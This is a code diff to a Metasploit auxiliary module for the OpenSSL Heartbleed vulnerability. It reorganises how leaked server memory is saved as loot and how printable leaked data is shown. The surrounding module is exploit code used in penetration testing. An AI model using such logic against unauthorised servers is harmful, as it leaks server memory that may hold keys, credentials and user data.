@@ -294,15 +294,6 @@ class Metasploit3 < Msf::Auxiliary
         :refs => self.references,
         :info => "Module #{self.fullname} successfully leaked info"
       })
-      path = store_loot(
-        "openssl.heartbleed.server",
-        "application/octet-stream",
-        ip,
-        heartbeat_data,
-        nil,
-        "OpenSSL Heartbleed server memory"
-      )
-      vprint_status("#{peer} - Printable info leaked: #{heartbeat_data.gsub(/[^[:print:]]/, '')}")
       if datastore['STOREDUMP']
         pattern = datastore['PATTERN_FILTER']
         if !pattern.nil?
@@ -310,10 +301,17 @@ class Metasploit3 < Msf::Auxiliary
         else
           match_data = heartbeat_data
         end
-        path = store_loot("openssl_memory_dump", "octet/stream", rhost, match_data,
-          "openssl_server_memory_dump.bin", "OpenSSL Heartbeat Server Memory Dump")
-          print_status("#{peer} - Heartbeat data stored in #{path}")
+        path = store_loot(
+          "openssl.heartbleed.server",
+          "application/octet-stream",
+          ip,
+          heartbeat_data,
+          nil,
+          "OpenSSL Heartbleed server memory"
+        )
+        print_status("#{peer} - Heartbeat data stored in #{path}")
       end
+      vprint_status("#{peer} - Printable info leaked: #{heartbeat_data.gsub(/[^[:print:]]/, '')}")
     else
       vprint_error("#{peer} - Looks like there isn't leaked information...")
     end
